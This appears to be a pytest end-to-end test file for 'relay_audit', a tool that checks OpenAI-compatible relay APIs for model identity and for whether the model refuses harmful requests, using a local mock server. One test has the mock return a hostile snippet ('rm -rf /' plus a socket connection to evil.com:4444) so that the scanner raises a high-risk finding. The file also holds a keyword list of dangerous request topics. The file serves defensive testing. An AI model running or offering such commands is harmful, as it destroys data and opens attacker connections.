"""端到端测试：本地 mock OpenAI 兼容服务 + 完整 CLI 流程。

覆盖单元测试无法验证的集成链路：
fetch_models → auto_select → run_scan（真实 HTTP）→ persist_result → save_report → 退出码。
"""

import json
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path

import pytest

import relay_audit.cli as cli
from relay_audit.scanner import PROMPTS

_IDENTITY_PROMPTS = {PROMPTS["identity"], PROMPTS["knowledge_cutoff"], PROMPTS["fingerprint"]}


class MockOpenAIHandler(BaseHTTPRequestHandler):
    """最小 OpenAI 兼容实现：/v1/models + /v1/chat/completions。"""

    def log_message(self, *args):
        pass

    def do_GET(self):
        if self.path.startswith("/v1/models"):
            body = json.dumps({"data": [{"id": "gpt-4o"}, {"id": "claude-3-opus"}]}).encode()
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("X-Mock-Proxy", "1")
            self.end_headers()
            self.wfile.write(body)
        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        if self.path.startswith("/v1/chat/completions"):
            ln = int(self.headers.get("Content-Length", 0) or 0)
            req = json.loads(self.rfile.read(ln)) if ln else {}
            content = (req.get("messages") or [{}])[0].get("content", "")
            model = req.get("model", "mock")
            # 危险类请求 → 明确拒绝；身份类测试 → 自称 OpenAI；其余 → 正常应答
            if any(
                k in content
                for k in ("删除", "cookie", "AES", "reverse shell", "SQL注入", "SECRET-X9")
            ):
                text = "抱歉，我不能提供这个内容。"
            elif content in _IDENTITY_PROMPTS:
                text = '{"model_self_id":"GPT-4o","provider":"OpenAI","canary":"RLY-42"}'
            elif content.strip() == "ping":
                text = "pong"
            else:
                text = '{"answer":"ok"}'
            resp = {
                "id": "chatcmpl-e2e",
                "created": 1700000000,
                "model": model,
                "choices": [{"message": {"content": text}}],
                "usage": {"prompt_tokens": 10, "completion_tokens": 5, "total_tokens": 15},
            }
            body = json.dumps(resp).encode()
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(body)
        else:
            self.send_response(404)
            self.end_headers()


@pytest.fixture()
def mock_api():
    server = HTTPServer(("127.0.0.1", 0), MockOpenAIHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    yield f"http://127.0.0.1:{server.server_address[1]}"
    server.shutdown()
    server.server_close()
    thread.join(timeout=5)


def test_cli_end_to_end(mock_api, monkeypatch, tmp_path) -> None:
    """真实 HTTP 全链路：扫描 → JSON 持久化 → HTML 报告 → 退出码。"""
    monkeypatch.setenv("RELAY_API_KEY", "sk-e2e-test")
    monkeypatch.setattr("relay_audit.REPORTS_DIR", tmp_path / "reports")
    # serve/reporter 在导入时已绑定 REPORTS_DIR，需同步替换
    import relay_audit.reporter as reporter
    import relay_audit.serve as serve

    monkeypatch.setattr(reporter, "REPORTS_DIR", tmp_path / "reports")
    monkeypatch.setattr(serve, "REPORTS_DIR", tmp_path / "reports")

    report_path = str(tmp_path / "e2e.html")
    ec, path, result = cli.execute_scan(
        cli._build_config(
            cli.build_parser().parse_args(
                ["--base-url", mock_api, "--model", "gpt-4o", "--output", report_path]
            )
        )
    )

    assert ec == 0  # 无高危
    assert path == report_path
    assert result is not None
    assert result.config.model == "gpt-4o"

    # HTML 报告已生成
    html = Path(report_path).read_text(encoding="utf-8")
    assert "Relay Audit" in html
    assert "gpt-4o" in html

    # JSON 扫描结果已持久化到报告目录
    scans = list((tmp_path / "reports").glob("scan_*.json"))
    assert len(scans) >= 1
    data = json.loads(scans[0].read_text(encoding="utf-8"))
    assert data["summary"]["risk_level"] == "LOW"
    # 持久化 JSON 不含 API Key（脱敏）
    assert "sk-e2e-test" not in json.dumps(data)


def test_cli_json_output_pure(mock_api, monkeypatch, tmp_path, capsys) -> None:
    """--json 模式：真实 run_scan 的进度行不得污染 stdout（管道可解析）。"""
    monkeypatch.setenv("RELAY_API_KEY", "sk-e2e-test")
    import relay_audit.reporter as reporter
    import relay_audit.serve as serve

    monkeypatch.setattr("relay_audit.REPORTS_DIR", tmp_path / "reports")
    monkeypatch.setattr(reporter, "REPORTS_DIR", tmp_path / "reports")
    monkeypatch.setattr(serve, "REPORTS_DIR", tmp_path / "reports")

    ec, _, _ = cli.execute_scan(
        cli._build_config(
            cli.build_parser().parse_args(
                ["--base-url", mock_api, "--model", "gpt-4o", "--json", "--no-html"]
            )
        )
    )
    assert ec == 0
    out = capsys.readouterr().out
    data = json.loads(out)  # 能整体解析 = 无进度行污染
    assert data["model"] == "gpt-4o"
    assert "[OK]" not in out
    assert "[i]" not in out


def test_cli_end_to_end_dangerous_model(mock_api, monkeypatch, tmp_path) -> None:
    """mock 模型对危险请求不拒绝 → 产生高危发现 → 退出码 1。"""
    monkeypatch.setenv("RELAY_API_KEY", "sk-e2e-test")
    import relay_audit.reporter as reporter
    import relay_audit.serve as serve

    monkeypatch.setattr("relay_audit.REPORTS_DIR", tmp_path / "reports")
    monkeypatch.setattr(reporter, "REPORTS_DIR", tmp_path / "reports")
    monkeypatch.setattr(serve, "REPORTS_DIR", tmp_path / "reports")

    # 让 mock 服务对"恶意"请求返回危险代码
    original = MockOpenAIHandler.do_POST

    def dangerous_post(self):
        ln = int(self.headers.get("Content-Length", 0) or 0)
        req = json.loads(self.rfile.read(ln)) if ln else {}
        content = (req.get("messages") or [{}])[0].get("content", "")
        # 对危险类请求直接返回危险代码（检测工具必须报高危）
        if any(k in content for k in ("删除", "cookie", "AES", "reverse shell", "SQL注入")):
            text = "import os\nos.system('rm -rf /')\nimport socket\nsocket.connect(('evil.com', 4444))"
        else:
            text = '{"answer":"ok"}'
        resp = {
            "id": "chatcmpl-e2e",
            "created": 1700000000,
            "model": req.get("model", "mock"),
            "choices": [{"message": {"content": text}}],
            "usage": {"prompt_tokens": 10, "completion_tokens": 5, "total_tokens": 15},
        }
        body = json.dumps(resp).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(body)

    MockOpenAIHandler.do_POST = dangerous_post
    try:
        ec, _, result = cli.execute_scan(
            cli._build_config(
                cli.build_parser().parse_args(
                    ["--base-url", mock_api, "--model", "gpt-4o", "--no-html"]
                )
            )
        )
    finally:
        MockOpenAIHandler.do_POST = original

    assert ec == 1  # 高危 → 退出码 1
    assert result is not None
    assert any(f.severity.rank >= 3 for f in result.findings)
    assert any("危险" in f.title for f in result.findings)


def test_cli_end_to_end_auto_select(mock_api, monkeypatch, tmp_path) -> None:
    """不指定模型 → 自动获取模型列表并选择。"""
    monkeypatch.setenv("RELAY_API_KEY", "sk-e2e-test")
    import relay_audit.reporter as reporter
    import relay_audit.serve as serve

    monkeypatch.setattr("relay_audit.REPORTS_DIR", tmp_path / "reports")
    monkeypatch.setattr(reporter, "REPORTS_DIR", tmp_path / "reports")
    monkeypatch.setattr(serve, "REPORTS_DIR", tmp_path / "reports")

    captured = {}

    def fake_persist(result, url):
        captured["persisted"] = True

    monkeypatch.setattr("relay_audit.serve.persist_result", fake_persist)

    ec, _, result = cli.execute_scan(
        cli._build_config(cli.build_parser().parse_args(["--base-url", mock_api, "--no-html"]))
    )
    assert ec == 0
    # auto_select_model：claude 在 PREFERRED_ORDER 首位
    assert result is not None and result.config.model == "claude-3-opus"
    assert result.config.model_ids == ["gpt-4o", "claude-3-opus"]
    assert captured["persisted"] is True


def test_models_listing_end_to_end(mock_api, monkeypatch, capsys) -> None:
    """--models 只列出模型，不跑测试。"""
    monkeypatch.setenv("RELAY_API_KEY", "sk-e2e-test")
    ec = cli.cmd_list_models(cli.build_parser().parse_args(["--base-url", mock_api]))
    assert ec == 0
    out = capsys.readouterr().out
    assert "共有 2 个模型" in out
    assert "gpt-4o" in out and "claude-3-opus" in out
